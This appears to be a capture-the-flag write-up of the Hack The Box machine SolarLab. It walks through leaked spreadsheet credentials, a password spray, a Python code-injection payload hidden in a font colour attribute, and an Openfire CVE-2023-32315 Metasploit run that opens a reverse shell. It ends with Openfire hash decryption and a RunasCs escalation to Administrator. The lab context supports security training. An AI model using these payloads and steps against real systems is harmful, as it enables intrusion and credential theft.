On the smb share I found some interesting files. The user guest had read access. The following is an extract from the detials.xls file
![[Pasted image 20240515074439.png]]
```excel
| Site         | Account# | Username                  | Password            | Security Question                     | Answer             | Email                        | Other information                    |
|--------------|----------|---------------------------|----------------------|---------------------------------------|---------------------|------------------------------|---------------------------------------|
| Amazon.com   | 101-333  | Alexander.knight@gmail.com | al;ksdhfewoiuh       | What was your mother's maiden name?   | Blue                | Alexander.knight@gmail.com   |                                       |
| Pefcu        | A233J    | KAlexander                | dkjafblkjadsfgl      | What was your high school mascot      | Pine Tree           | Alexander.knight@gmail.com   |                                       |
| Chase        |          | Alexander.knight@gmail.com | d398sadsknr390       | What was the name of your first pet?  | corvette            | Claudia.springer@gmail.com   |                                       |
| Fidelity     |          | blake.byte                | ThisCanB3typedeasily1@| What was your mother's maiden name?   | Helena              | blake@purdue.edu             |                                       |
| Signa        |          | AlexanderK                | danenacia9234n       | What was your mother's maiden name?   | Poppyseed muffins   | Alexander.knight@gmail.com   | account number: 1925-47218-30         |
|              |          | ClaudiaS                  | dadsfawe9dafkn       | What was your mother's maiden name?   | yellow crayon       | Claudia.springer@gmail.com   | account number: 3872-03498-45         |

```

## RID Bruteforcing
![[Pasted image 20240515082011.png]]
```shell
└─$ nxc smb 10.10.11.16 -u blake -p passwords.txt --shares
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:al;ksdhfewoiuh STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:dkjafblkjadsfgl STATUS_LOGON_FAILURE 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake:ThisCanB3typedeasily1@ 
SMB         10.10.11.16     445    SOLARLAB         [*] Enumerated shares
SMB         10.10.11.16     445    SOLARLAB         Share           Permissions     Remark
SMB         10.10.11.16     445    SOLARLAB         -----           -----------     ------
SMB         10.10.11.16     445    SOLARLAB         ADMIN$                          Remote Admin
SMB         10.10.11.16     445    SOLARLAB         C$                              Default share
SMB         10.10.11.16     445    SOLARLAB         Documents       READ            
SMB         10.10.11.16     445    SOLARLAB         IPC$            READ            Remote IPC

```

# Logging into the service
On port 6791 I was able to login into the service using the creds
blakeb:ThisCanB3typedeasily1@
![[Pasted image 20240515082903.png]]

## Remote Code Execution

## Payload
```html
<para>

    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('ping -n 4 10.10.14.25') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">

    exploit

    </font>

</para>
```
![[Pasted image 20240516200013.png]]
## Response
![[Pasted image 20240516200118.png]]


# User.db
On the machine I found a users.db file
```shel
sqlite> SELECT * FROM user;
1|blakeb|ThisCanB3typedeasily1@
2|claudias|007poiuytrewq
3|alexanderk|HotP!fireguard

```

# Access to agent's local ports (127.0.0.1)
If you need to access the local ports of the currently connected agent, there's a "magic" IP hardcoded in Ligolo-ng: _240.0.0.1_ ( This IP address is part of an unused IPv4 subnet). If you query this IP address, Ligolo-ng will automatically redirect traffic to the agent's local IP address (127.0.0.1).

Example:

```
$ sudo ip route add 240.0.0.1/32 dev ligolo
$ nmap 240.0.0.1 -sV
``` 

## Nmap
```shell
└─$ nmap 240.0.0.1 -A  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-16 16:27 EDT
Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.00% done; ETC: 16:30 (0:00:13 remaining)
Nmap scan report for 240.0.0.1
Host is up (0.035s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE             VERSION
80/tcp   open  http                nginx 1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
|_http-server-header: nginx/1.24.0
135/tcp  open  msrpc               Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Length: 2045
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 16 May 2024 20:29:11 GMT
|     Server: waitress
|     Vary: Cookie
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Login - ReportHub</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f5f5f5;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     flex-direction: column;
|     align-items: center;
|     height: 100vh;
|     .logo {
|     max-width: 200px;
|     margin-bottom: 20px;
|     display: block;
|     margin: 0 auto;
|     text-align: center;
|     color: #333;
|     form {
|     max-w
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Connection: close
|     Content-Length: 63
|     Content-Type: text/plain; charset=utf-8
|     Date: Thu, 16 May 2024 20:29:12 GMT
|     Server: waitress
|     Request
|     Start line is invalid
|_    (generated by waitress)
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=solarlab.htb
| Subject Alternative Name: DNS:solarlab.htb, DNS:*.solarlab.htb
| Not valid before: 2023-11-17T12:22:21
|_Not valid after:  2028-11-15T12:22:21
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     stream_id: 31shzcwmcq
|     compression_methods: 
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
|_    features: 
5269/tcp open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     compression_methods: 
|     xmpp: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     capabilities: 
|_    features: 
7070/tcp open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:06 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:12 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp open  ssl/oracleas-https?
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:13 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:18 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=solarlab.htb
| Subject Alternative Name: DNS:solarlab.htb, DNS:*.solarlab.htb
| Not valid before: 2023-11-17T12:22:21
|_Not valid after:  2028-11-15T12:22:21
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:06 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:12 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
| ssl-cert: Subject: commonName=solarlab.htb
| Subject Alternative Name: DNS:solarlab.htb, DNS:*.solarlab.htb
| Not valid before: 2023-11-17T12:22:21
|_Not valid after:  2028-11-15T12:22:21
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:23 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 16 May 2024 20:29:24 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>

```

# OpenFire
![[Pasted image 20240516214025.png]]

# openfire_auth_bypass_rce_cve_2023_32315
Using the vulnenrable version I was able to gain RCE using the above payload in MSFconsole
```
msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > set RHOSTS 240.0.0.1
RHOSTS => 240.0.0.1
msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > set LHOST tun0
LHOST => 10.10.14.25
msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > run

[*] Started reverse TCP handler on 10.10.14.25:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Openfire version is 4.7.4
[*] Grabbing the cookies.
[*] JSESSIONID=node09kpjjw4hejfe186qtpjv0voed18.node0
[*] csrf=lESt65Fq8Am5zBw
[*] Adding a new admin user.
[*] Logging in with admin user "pdkhzyfzpzlztdu" and password "yiauW7EA".
[*] Upload and execute plugin "BOQTkLqzb3Lv19" with payload "java/shell/reverse_tcp".
[*] Sending stage (2952 bytes) to 10.10.11.16
[!] Plugin "BOQTkLqzb3Lv19" need manually clean-up via Openfire Admin console.
[!] Admin user "pdkhzyfzpzlztdu" need manually clean-up via Openfire Admin console.
[*] Command shell session 3 opened (10.10.14.25:4444 -> 10.10.11.16:58039) at 2024-05-17 01:53:59 -0400


Shell Banner:
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Openfire\bin>
-----
          

C:\Program Files\Openfire\bin>

```

# Admin Hash
```shell
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
INSERT INTO OFUSERPROP VALUES('admin','console.rows_per_page','/session-summary.jsp=25')

```
# openfire_decrypt
using the following github https://github.com/c0rdis/openfire_decrypt.git I am going to try and decrypt the hash

```java
import javax.crypto.Cipher;
import java.security.MessageDigest;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class OpenFireDecryptPass
{
  public static void main(String[] argv) throws Exception
  {
    if (argv.length < 2)
    {
      System.out.println("[-] Please specify the encypted password and the \"passwordKey\"");
      return;
    }
    
    MessageDigest md = MessageDigest.getInstance ("SHA-1");

    byte[] keyParam = md.digest (argv[1].getBytes ("utf8"));
    byte[] ivBytes  = hex2bytes (argv[0].substring (0, 16));
    byte[] encryptedString = hex2bytes (argv[0].substring (16)); // 8 * 2 (since hex)

    IvParameterSpec iv = new IvParameterSpec (ivBytes);
    SecretKeySpec key  = new SecretKeySpec (keyParam, "Blowfish");

    Cipher cipher = Cipher.getInstance ("Blowfish/CBC/PKCS5Padding");
    cipher.init (Cipher.DECRYPT_MODE, key, iv);
    byte[] decrypted = cipher.doFinal (encryptedString);

    String decryptedString = bytes2hex (decrypted);

    System.out.println (new String(decrypted) + " (hex: " + decryptedString + ")");
  }

  public static byte[] hex2bytes(String str)
  {
    if (str == null || str.length() < 2) return null;
    else
    {
      int len = str.length() / 2;
      byte[] buffer = new byte[len];

      for (int i = 0; i < len; i++) buffer[i] = (byte) Integer.parseInt(str.substring(i * 2, i * 2 + 2), 16);

      return buffer;
    }

  }

  public static String bytes2hex(byte[] data)
  {
    if (data == null) return null;
    else
    {
      int len = data.length;

      String str = "";

      for (int i = 0; i < len; i++)
      {
        if ((data[i] & 0xFF) < 16) str = str + "0" + java.lang.Integer.toHexString(data[i] & 0xFF);
        else str = str + java.lang.Integer.toHexString(data[i] & 0xFF);
      }
      return str.toUpperCase();
    }
  }
}
```

## Cracking the password
```shell
└─$ javac OpenFireDecryptPass.java
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/SolarLab/openfire_decrypt]
└─$ java OpenFireDecryptPass "becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442" "hGXiFzsKaAeYLjn"

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)

```

# Root
```powershell
PS C:\Users\openfire\Desktop> .\RunasCs.exe Administrator "ThisPasswordShouldDo!@" "cmd.exe /c whoami"
.\RunasCs.exe Administrator "ThisPasswordShouldDo!@" "cmd.exe /c whoami"

solarlab\administrator

.\RunasCs.exe Administrator "ThisPasswordShouldDo!@" "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"
```